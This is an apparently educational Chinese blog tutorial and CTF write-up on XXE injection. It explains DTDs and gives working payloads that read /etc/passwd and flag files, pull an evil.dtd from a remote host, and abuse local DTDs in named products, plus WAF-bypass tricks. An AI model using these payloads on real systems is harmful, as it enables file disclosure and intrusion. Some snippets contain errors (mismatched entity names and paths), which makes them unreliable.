---
title: XXE注入攻击
date: 2020-05-05 10:26:14
updated: 2020-05-05 10:26:14
categories: web
---

XXE注入攻击<!--more-->

# XML基础知识

<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-docx-file" target="_blank">XXE PAYLOADS</a>

<a href="https://www.runoob.com/xml/xml-tutorial.html" target="_blank">链接</a>

## XML语法规则如下：

1. 所有的XML元素都必须有一个关闭标签
2. XML标签对大小写敏感
3. XML必须正确嵌套
4. XML属性值必须加引号
5. 实体引用
6. 在XML中，空格会被保留（案例如：<p>a空格B</p>，这时候a和B之间的空格就会被保留）



# XXE漏洞

> XXE全称是XML External Entity,也就是XML`外部实体`注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。



## DTD

>DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。
>它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中(内部声明），也可作为一个外部引用。

### 内部声明DTD

` <!DOCTYPE 根元素 [元素声明]>`

````
<?xml version="1.0" encoding="UTF-8"?>
<！DOCTYPE note[       //DTD
<！ELEMENT note（to,from,login）>    //定义元素
<！ELEMENT to（#PCDATA）>
<！ELEMENT from（#PCDATA）>
<！ELEMENT login（#PCDATA）>
]>
<note>
<to> tony </ to>
<from> anmi </ from>
<login>123</ login>
</ note>
````



### 引用外部DTD:

`<!DOCTYPE 根元素 SYSTEM "文件名">`
`<!DOCTYPE 根元素 PUBLIC "public_ID" "文件名">`

```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```
这是包含DTD的“ note.dtd”文件：
```
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```



---

  在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。

>参数实体(用%声明,用%引用。 DTD中声明,DTD中引用)            
>其余实体(直接用实体名称声明,使用&引用。  DTD中声明,xml中引用)    

```
内部实体:            
<!ENTITY 实体名称 "实体内容">    

外部实体:
<!ENTITY 实体名称 SYSTEM "URI">        
<!ENTITY 实体名称 PUBLIC "public_ID" "URI">

参数实体:
<!ENTITY % 实体名称 "实体内容">    
```

#  怎么判断网站是否存在XXE漏洞

最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞



# 构造外部实体注入的方法

## 直接通过DTD外部实体声明

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE NPFS[
<!ENTITY  npfs SYSTEM "file:///home/ctf/flag.txt">]>
<something>&npfs;</something>
```

## 通过DTD文档引入外部DTD文档，再引入外部实体声明

xml内容：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
       <!ENTITY %d SYSTEM "http://www.123.com/evil.dtd">
       %d;
]>
<aaa>&b;</aaa>
```

DTD文件(evil.dtd)内容

```
<!ENTITY b SYSTEM "file:///etc/passwd">
```

## 通过DTD外部实体声明引入外部实体声明

xml内容：

```
<?xml verstion="1.0" encoding="utf-8"?>
<!DOCTYPE a SYSTEM "http://www.123.com/evil.dtd">
<a>&b;</a>
```

DTD文件(evil.dtd)内容

```
<!ENTITY b SYSTEM "file:///etc/passwd">
```

另外，不同程序支持的协议是不一样:

![](https://img.npfs06.top/20210306103114.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

参数实体还能嵌套定义但是内层的参数实体的%需要进行HTML转义，否则会解析出错

就如下面一样:

```none
<?xml version="1.0"?>
<!DOCTYPE a[
    <!ENTITY % para '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
]>
```

这里的`%`转义之后即为符号串`&#x25`

## 内部（本地）DTD调用

当防火墙不允许引用外部DTD时，我们可以引用本地dtd文件

# 以下是一些常见的本地DTD文件位置

## Custom Linux System

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa 'Your DTD code'>
%local_dtd;
```

## Custom Windows System

```
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
<!ENTITY % SuperClass '>Your DTD code<!ENTITY test "test"'>
%local_dtd;
```

## Cisco WebEx

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
%local_dtd;
```

## Citrix XenMobile Server

```
<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
%local_dtd;
```

## Custom Multi-Platform IBM WebSphere Application

```
<!ENTITY % local_dtd SYSTEM "./../../properties/schemas/j2ee/XMLSchema.dtd">
<!ENTITY % xs-datatypes 'Your DTD code'>
<!ENTITY % simpleType "a">
<!ENTITY % restriction "b">
<!ENTITY % boolean "(c)">
<!ENTITY % URIref "CDATA">
<!ENTITY % XPathExpr "CDATA">
<!ENTITY % QName "NMTOKEN">
<!ENTITY % NCName "NMTOKEN">
<!ENTITY % nonNegativeInteger "NMTOKEN">
%local_dtd;
```



---

如何使用内部DTD

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file &#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```







# (Jarvis OJ）api调用

 <a href=' <http://web.jarvisoj.com:9882/>' target="_blank">题目链接</a>

go,抓包


可以发现这里应用的content-Type是json

>JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。其诞生原因是因为XML整合到HTML中各个浏览器实现的细节不尽相同
>
> JSON有2种结构形式，键值对形式和数组形式（如箭头二所示）

又因为题目hint:请设法获得目标机器/home/ctf/flag.txt中的flag值

判断为XXE漏洞

将json修改为xml,并构造外部引用

![](https://images.cnblogs.com/cnblogs_com/NPFS/1757701/o_200505085208$U4YCM74%7D$1GDZW6%601E3YE2.png)

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE note [
  <!ENTITY NPFS SYSTEM "file:///home/etc/flag.txt">
  ]>  
<somrthing>&npfs;</something>
```


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY file SYSTEM "file:///etc/passwd" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```



# WAF

**方法1：文档中的额外空格**

由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在`<?xml?>`或`<!DOCTYPE>`中插入额外的空格，从而绕过此类WAF。

![](https://img.npfs06.top/20210306103136.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

**方法2：格式无效**

为了绕过WAF，攻击者可能会发送特殊格式的XML文档，以便WAF认为它们无效。

链接到未知实体

比较成熟的WAF设置通常不会读取链接文件的内容。这种策略通常是有意义的，否则，WAF本身也可能成为攻击的目标。问题是，外部资源的链接不仅可以存在于文档的第三部分（正文），还可以存在于声明<! DOCTYPE>中 。
这意味着未读取文件内容的WAF将不会读取文档中实体的声明。而指向未知实体的链接又会阻止XML解析器导致错误。

![](http://img.npfs06.top/20210306103204.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
幸运的是，防止这样的绕过非常简单——命令WAF中的XML解析器在遇到未知实体后不要关闭。

**方法三:外来编码（Exotic encodings**

除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。
更多信息：<https://www.w3.org/TR/xml/#sec-guessing>
一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。
在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。
外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。

**方法4：在一个文档中使用两种类型的编码**

在上一节中，我们演示了文档的编码通常由其第一个字节指定。但是当包含编码属性的<?xml?>标记引用文档开头的不同字符集时会发生什么？在这种情况下，一些解析器更改编码，使文件的开头有一组字符，其余的是另一组编码。。也就是说，不同的解析器可能在不同的时间转换编码。Java解析器(javax.xml.parsers)在<?xml?>结束后严格地更改字符集，而libxml2解析器可以在执行“编码”属性的值之后或在处理<?xml?>之前或之后切换编码。
只有在根本不处理这些文件时，比较成熟的WAF才能可靠地防止这些文件中的攻击。我们还必须记住，有许多同义词编码，例如UTF-32BE和UCS-4BE。此外，有些编码可能不同，但从编码文档初始部分 `<?xml?>`的角度来看，它们是兼容的。例如，看似UTF-8的文档可能包含字符串`<?xml version=”1.0” encoding=”windows-1251”?>`。

参考：

<https://xz.aliyun.com/t/3357#toc-22>
<https://p0rz9.github.io/2019/02/27/xxe/#>
<https://security.tencent.com/index.php/blog/msg/69>